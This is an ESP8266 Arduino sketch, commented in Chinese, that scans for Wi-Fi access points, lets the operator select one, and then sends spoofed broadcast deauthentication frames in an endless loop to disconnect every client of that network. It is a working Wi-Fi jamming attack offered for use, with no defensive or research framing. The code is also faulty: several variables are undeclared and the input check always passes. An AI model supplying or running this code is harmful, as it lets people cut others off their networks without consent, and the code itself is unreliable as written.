#include <ESP8266WiFi.h>
#include <WiFiClient.h>
extern "C" {
#include "user_interface.h"
}

uint8_t deauthPacket[26] = {
  /*  0 - 1  */ 0xC0, 0x00,                         //Type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00,                         //Duration (SDK takes care of that)
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //Reciever (target, broadcast)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //Source (ap)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00,                         //Fragment & squence number
  /* 24 - 25 */ 0x01, 0x00                          //Reason code (1 = unspecified reason)
};

void setup() {
  wifi_set_opmode(STATION_MODE);
  uint8_t i;

//扫描热点
  int ap_count = WiFi.scanNetworks();
  int selected;
  Serial.println();
  for(i = 0; i < ap_count; i++) {
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (");
    Serial.print(WiFi.RSSI(i));
    Serial.println(")");
  }

//选择热点
  while(true) {
    Serial.println("Select AP...");
    while(!Serial.available()) delay(50);
    selected = Serial.parseInt();
    if(selected < ap_count || selected > 0) break;
  }
  selected_ch = WiFi.channel(selected - 1);
  for(i = 0; i < 6; i++) selected_ap[i] = WiFi.BSSID(selected - 1)[i];
  selected_ssid = WiFi.SSID(selected - 1);

//设置参数
  Serial.print("Attacking ");
  Serial.print(selected_ssid);
  Serial.print('[');
  for (i = 0; i < 6; i++) {
    if (selected_ap[i] < 0x10) Serial.print('0');
    Serial.print(selected_ap[i], HEX);
    if (i < 5) Serial.print(':');
  }
  Serial.print("] on CH");
  Serial.println(selected_ch);
  wifi_set_channel(selected_ch);
  for(i = 0; i < 6; i++)
    deauthPacket[10 + i] = deauthPacket[16 + i] = selected_ap[i];
}

void loop() {
//循环攻击
  wifi_promiscuous_enable(1);
  if(wifi_send_pkt_freedom(deauthPacket, 26, 0) == -1) {
    Serial.println("Deauth error");
    return;
  }
  delay(500);
}
